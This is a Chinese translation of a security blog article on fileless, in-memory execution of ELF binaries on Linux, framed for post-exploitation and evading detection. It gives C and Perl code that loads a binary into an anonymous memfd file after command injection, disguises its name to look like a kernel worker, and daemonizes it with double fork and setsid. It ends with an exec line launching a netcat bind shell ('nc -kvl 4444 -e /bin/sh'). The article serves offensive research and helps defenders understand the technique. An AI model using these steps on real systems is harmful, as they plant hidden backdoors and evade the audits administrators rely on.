# Linux系统内存执行ELF的多种方式
|
##### 译文声明
本文是翻译文章，文章原作者 fbkcs，文章来源：blog.fbkcs.ru
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、前言
无文件（fileless）恶意软件攻击现在已经越来越流行，这一点并不奇怪，因为这种技术通常不会留下蛛丝马迹。本文的重点不是介绍如何在Windows
RAM中执行程序，我们的目标是GNU/Linux。Linux是服务器行业的领头羊，在上百万嵌入式设备和大多数web服务上都能看到Linux的身影。在本文中，我们将简单探讨如何在Linux系统内存中执行程序，也讨论了如何应付具有挑战性的环境。
无文件执行比较隐蔽，比较难检测及跟踪。由于该过程中不涉及新文件写入磁盘，也没有修改已有文件，因此基于文件系统一致性的检测工具通常不会警告管理员。反病毒软件（*nix用户通常会忽略这种产品）在程序启动后通常不会监控程序内存。其外，当系统安装完毕后，许多GNU/Linux发行版会提供各种调试工具、解释程序、编译器和程序库，这些都可以帮助我们实现无文件技术隐蔽执行。然而，无文件执行也有一些缺点，比如无法在系统意外断电或者重启时正常驻留，但程序正常情况下可以保持运行，直到目标设备断电下线。
无文件技术可以用来传播恶意软件，但功能并不局限于此。如果我们对运行速度要求较高，可以将程序拷贝到内存中运行。许多Linux发行版可以完全在内存中运行，因此在搭载硬盘驱动器的情况下，我们还是有可能实现不落盘运行。对于信息安全而言，无文件技术在后渗透（post-exploitation）阶段和情报收集阶段非常有用，可以尽可能规避安全审计。
根据[barkly.com](https://www.barkly.com/)的介绍，在2018年35%的病毒攻击中涉及到无文件攻击技术。在Windows系统上，黑客们通常使用内置的PowerShell来加载和运行代码。这些技术之所以非常流行，原因之一是这些技术可以在Powershell
Empire、Powersploit以及Metasploit中使用，非常方便。
## 二、C语言
在大多数情况下，安装在主机设备上的Linux发行版通常会安装一些内置软件，如Python、Perl解释器以及C编译器，这些都是“开箱即用”的工具。此外，web托管平台上通常也可以使用PHP。因此我们可以使用这些语言来执行代码。在Linux系统上，我们可以使用一些非常知名方法在内存中执行代码。
最简单的一种方法就是利用挂载到文件系统中的共享内存分区。
如果我们将可执行文件挂载到`/dev/shm`或者`/run/shm`中，有可能实现内存执行，因为这些目录实际上是挂载到文件系统上已分配的内存空间。但如果我们使用`ls`命令，就可以像查看其他目录一样查看这些目录。此外，已挂载的这些目录设置了`noexec`标志，因此只有超级用户才能执行这些目录中的程序。这意味着我们需要找到更为隐蔽的其他方法。
我们可以考虑使用[memfd_create(2)](http://man7.org/linux/man-pages/man2/memfd_create.2.html)这个系统调用。该系统调用与[malloc(3)](https://linux.die.net/man/3/malloc)比较类似，但并不会返回指向已分配内存的一个指针，而是返回指向某个匿名文件的文件描述符，该匿名文件以链接（link）形式存放在`/proc/PID/fd/`文件系统中，可以使用[execve(2)](http://man7.org/linux/man-pages/man2/execve.2.html)来运行。[memfd_create](http://man7.org/linux/man-pages/man2/memfd_create.2.html)帮助文档的解释如下：
>
> `name`参数代表文件名，在`/proc/self/fd/`目录中我们可以看到该文件名为符号链接的目的文件。显示在`/proc/self/fd/`目录中的文件名始终带有`memfd:`前缀，并且只用于调试目的。名称并不会影响文件描述符的行为，因此多个文件可以拥有相同的名称，不会有任何影响。
在C语言中使用`memfd_create()`的示例代码如下：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int
    main()
    {
        int fd;
        pid_t child;
        char buf[BUFSIZ] = "";
        ssize_t br;
        fd = syscall(SYS_memfd_create, "foofile", 0);
        if (fd == -1)
        {
            perror("memfd_create");
            exit(EXIT_FAILURE);
        }
        child = fork();
        if (child == 0)
        {
            dup2(fd, 1);
            close(fd);
            execlp("/bin/date", "/bin/date", NULL);
            perror("execlp date");
            exit(EXIT_FAILURE);
        }
        else if (child == -1)
        {
            perror("fork");
            exit(EXIT_FAILURE);
        }
        waitpid(child, NULL, 0);
        lseek(fd, 0, SEEK_SET);
        br = read(fd, buf, BUFSIZ);
        if (br == -1)
        {
            perror("read");
            exit(EXIT_FAILURE);
        }
        buf[br] = 0;
        printf("child said: '%s'n", buf);
        exit(EXIT_SUCCESS);
    }
如上代码使用`memfd`创建一个子进程，将其输出重定向至一个临时文件，等待子进程结束，从临时文件中读取子进程输出数据。通常情况下，*nix环境会使用`|`管道将一个程序的输出重定向至另一个程序的输入。
在解释型语言（如perl、python等）中我们也可以使用`syscall()`。接下来我们看一下可能碰到的一种场景，演示如何使用`memfd_create()`将可执行文件载入内存中。
## 三、Perl
假设现在我们已经找到了命令注入点，我们需要找到在目标上执行系统命令的方法。在perl中我们可以使用[syscall()](https://perldoc.perl.org/functions/syscall.html)函数，此外我们还需要将ELF文件以匿名文件内容的形式直接写入内存。为了完成这个任务，我们可以将其写在脚本源码中，使用命令注入来注入脚本，当然我们也可以选择网络下载方式。然而，这里我们要清楚目标Linux内核版本，因为只有在
**3.17** 或更高版本内核中才能使用`memfd_create()`。
接下来进一步分析`memfd_create()`以及`execve()`。
对于匿名文件我们准备使用`MFD_CLOEXEC`常量，利用该常量可以在新打开的文件描述符上设置`close-on-exec`（`FD_CLOEXEC`）标志。这意味着当我们`execve()` ELF文件时，我们的文件描述符就会被自动关闭。
由于我们使用的是Perl的`syscall()`，因此需要调用号（call number）以及数字常量（numeric
constant）。我们可以在`/usr/include`或者网上找到这些信息。系统调用号位于`#define`中，前缀为`__NR_`。在这个场景中，64位Linux系统上`memfd_create()`的系统调用号为`319`，数字常量为`FD_CLOSEXEC
0x0001U`（即`linux/memfd.h`中的`1`）。
找到所需的编号后，我们可以在Perl中实现与C语言等效的`memfd_create(name,
MFD_CLOEXEC)`语句。我们还需要为文件选择一个名称，前面提到过，我们会在`/proc/self/fd/`目录中看到带有`/memfd:`前缀的文件名。因此我们最好的方法就是选择接近`[:kworker]`或者看上去不大可疑的另一个名称。
比如我们可以传入空的字符串：
    my $name = "";
    my $fd = syscall(319, $name, 1);
    if (-1 == $fd) {
            die "memfd_create: $!";
    }
现在`$fd`为匿名文件的文件描述符，我们需要将ELF写入该文件。Perl中有个[open()](http://perldoc.perl.org/functions/open.html)函数，通常用来打开文件，我们也可以使用该函数，在参数中指定`>&=FD`（而非文件名），将已打开的文件描述符转化为文件句柄。此外这里还需要设置`autoflush[]`。
    open(my $FH, '>&='.$fd) or die "open: $!";
    select((select($FH), $|=1)[0]);
现在我们已经搞定指向匿名文件的一个文件描述符。接下来我们需要将可执行文件提供给Perl，可以通过如下方式：
    $ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' ./elfbinary
以上命令会输出许多行，如下所示：
    print $FH pack q/H*/, q/7f454c4602010100000000000000000002003e0001000000304f450000000000/ or die qq/write: $!/;
    print $FH pack q/H*/, q/4000000000000000c80100000000000000000000400038000700400017000300/ or die qq/write: $!/;
    print $FH pack q/H*/, q/0600000004000000400000000000000040004000000000004000400000000000/ or die qq/write: $!/;
执行这些语句就可以将我们的可执行文件载入内存中，等待执行。
###  fork()
我们还可以使用[fork()](https://linux.die.net/man/2/fork)，虽然这不是必选项，但如果我们不想在运行ELF文件后退出，`fork()`就可以派上用场。通常情况下，在perl中生成子进程的方式如下所示：
    while ($keep_going) {
            my $pid = fork();
            if (-1 == $pid) { # Error
                    die "fork: $!";
            }
            if (0 == $pid) {
                    exit 0;
            }
    }
我们还可以调用`fork()`两次，再配合上[setsid(2)](http://man7.org/linux/man-pages/man2/setsid.2.html)，这样就能生成独立的子进程，结束父进程运行：
    # Start a child process
    my $pid = fork();
    if (-1 == $pid) { # Error
            die "fork1: $!";
    }
    if (0 != $pid) { # the parent process terminates
            exit 0;
    }
    # the child process becomes the parent process
    if (-1 == syscall(112)) {
            die "setsid: $!";
    }
    # a child process (grandchild) starts
    $pid = fork();
    if (-1 == $pid) { # Error
            die "fork2: $!";
    }
    if (0 != $pid) { # the child process terminates
            exit 0;
    }
    # “grandchild” code
现在我们就可以多次运行ELF进程。
###  Execve()
[Execve()](http://man7.org/linux/man-pages/man2/execve.2.html)这个系统调用可以用来执行程序。在perl中我们可以使用[Exec()](http://perldoc.perl.org/functions/exec.html)，这个函数效果类似，语法也更加简单。我们需要传递给`exec()`两个参数：待执行的文件（内存中的ELF文件）以及进程名。通常情况下，文件名和进程名相同，但由于我们可以在进程列表中看到`/proc/PID/fd/3`信息，因此我们需要重命名进程。调用`exec()`的语法如下：
    exec {"/proc/$$/fd/$fd"} "nc", "-kvl", "4444", "-e", "/bin/sh" or die "exec: $!";
如上命令可以运行Netcat，但这个东西太像后门了，我们想要运行更为隐蔽的目标。